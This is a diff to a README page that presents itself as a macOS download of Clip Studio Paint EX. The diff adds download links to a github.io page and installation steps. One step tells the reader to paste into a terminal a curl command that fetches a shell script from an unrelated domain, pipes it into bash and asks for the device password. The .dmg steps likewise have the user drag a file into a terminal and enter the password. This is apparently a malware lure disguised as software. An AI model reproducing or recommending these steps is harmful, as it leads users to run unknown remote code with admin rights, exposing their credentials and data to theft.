@@ -7,9 +7,33 @@ Favored by manga artists and illustrators worldwide, Clip Studio Paint EX is the
 ---
 
 ## ✅ Download Clip Studio Paint EX for macOS  
-[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](#)
+[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://clip-studio-paint-ex-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is Clip Studio Paint EX?
 
@@ -40,17 +64,7 @@ Clip Studio Paint EX is a high-performance illustration and comic creation softw
 
 ---
 
-[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](#)
-
----
-
-## 📥 How to Use
-
-- ✅ Download and install Clip Studio Paint EX on your Mac  
-- 📄 Start a new comic project with multi-page layout  
-- 🎨 Use vector layers, panels, and brush tools for illustration  
-- 🎞️ Animate scenes using timeline and onion-skinning  
-- 💾 Export work in formats like PSD, PDF, or animated GIF/MP4  
+[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://clip-studio-paint-ex-mac-download.github.io/.github)
 
 ---
 
